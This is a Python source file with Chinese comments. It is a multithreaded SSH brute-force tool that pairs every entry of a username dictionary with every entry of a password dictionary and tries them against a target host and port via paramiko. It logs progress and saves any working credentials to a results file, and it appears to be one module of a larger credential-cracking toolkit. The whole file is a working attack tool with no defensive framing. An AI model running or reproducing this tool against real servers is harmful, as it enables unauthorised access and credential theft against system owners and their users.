import paramiko # 远程破解库
import queue
import threading
import time
from conf import config # 配置文件
from lib.choose import UseStyle # 设置颜色


schedule = 0 # 记录请求多少次
count=1 # 记录文件内容一个多少行


pause=False # 破解成功用于暂程和禁止输出的


# 提取出来的结果保存起来
def Searchresults(results_IP):
    Searchresults_document = open(config.Savelocation['ssh'], 'a')  # 打开文件写的方式
    Searchresults_document.write((results_IP+'\n'))  # 写入
    Searchresults_document.close()  # 关闭文件

# 读取字典文件内容
def current_time():
    return time.strftime("[%Y-%m-%d_%H:%M:%S]: [*]", time.localtime())

# 提取用户
def Read_dictionary(user,passwd):
    global count # 记录文件内容一个多少行

    # 叫文件内容变成
    search=queue.Queue() # 存

    for i_user in open(user, encoding="UTF-8"):
        for i_passwd in open(passwd, encoding="UTF-8"):
            diclist=i_user.rstrip()+'|'+i_passwd.rstrip()
            search.put(diclist)
    count=str(search.qsize())
    print("组成的字典数量："+count)
    return search



def try_to_log_in(Thread,host,port):
    global pause # 一共数量
    global schedule # 记录请求数量
    while not Thread.empty():
        user_passwd=Thread.get()
        user_passwd=user_passwd.split('|')

        #print(user_passwd[0]+'='+user_passwd[1])
        if pause == True:# 破解成功用于暂程和禁止输出的
            break
        else:
            try:
                # 实例化SSHClient
                ssh_client = paramiko.SSHClient()

                # 自动添加策略，保存服务器的主机名和密钥信息，如果不添加，那么不再本地know_hosts文件中记录的主机将无法连接
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                # 连接
                ssh_client.connect(hostname=host, port=int(port),username=user_passwd[0],password=user_passwd[1], timeout=1)
                ssh_client.close()
                print(UseStyle(current_time()+'[OK] 用户名' + user_passwd[0] +'密码'+ user_passwd[1], fore='green'))
                Searchresults(f'[OK] {host}\t{str(port)}\t{user_passwd[0]}\t{user_passwd[1]}')
                pause = True  # 破解成功用于暂程和禁止输出的
                break
            except paramiko.ssh_exception.AuthenticationException:
                if pause == True:  # 破解成功用于暂程和禁止输出的
                    break
                else:
                    schedule+=1
                    print(UseStyle(current_time()+f"密码错误进度{schedule}/{count}：",fore='yellow')+UseStyle(f"用户{user_passwd[0]}密码{user_passwd[1]}",fore='red'))
            except paramiko.ssh_exception.NoValidConnectionsError:
                print("目标端口没有开放")
                pause = True
            except paramiko.ssh_exception.SSHException:
                print("线程太大了！")
            finally:
                ssh_client.close() # 关闭连接

def Thread(args):
    threadpool = []

    # 提取字典
    user_passwd=Read_dictionary(args.user,args.document)

    for _ in range(int(args.thread)):
        Threads = threading.Thread(target=try_to_log_in, args=(user_passwd,args.host,args.port))
        threadpool.append(Threads)
    for th in threadpool:
        th.start()
    for th in threadpool:
        threading.Thread.join(th)
def Interface(args):

    args.host = args.ssh
    args.thread = args.ssht # 线程
    args.user = args.sshu # 用户
    args.document = args.sshd # 密码
    args.port = args.sshp # 端口

    # 判断默认
    if args.user == None: # 默认用户字典
        #args.user=config.Specifyablastdictionary['ssh']['admin']
        args.user = config.Specifyablastdictionary['ssh']['admin']
        user="当前使用的默认用户字典："+config.Specifyablastdictionary['ssh']['admin']
    else:
        user="当前使用指定用户字典文件在：" +args.user

    if args.document == None: # 默认密码字典
        args.document = config.Specifyablastdictionary['ssh']['passwd']
        document="当前使用的默认密码字典：" + config.Specifyablastdictionary['ssh']['passwd']
    else:
        document="当前使用的默认密码字典文件在：" + args.document


    if args.thread == None: # 设置默认线程
        args.thread = 1
        thread="默认线程：1"
    else:
        thread="当前指定的线程数："+str(args.thread)

    if args.port==None:
        args.port=22
        port="默认端口：22"
    else:
        port="当前指定端口"+str(args.port)

    print(UseStyle(f'破解成功结果保存到{config.Savelocation["ssh"]}\n{user}\n{document}\n{thread}\n{port}\n\n',fore='red'))
    Thread(args)
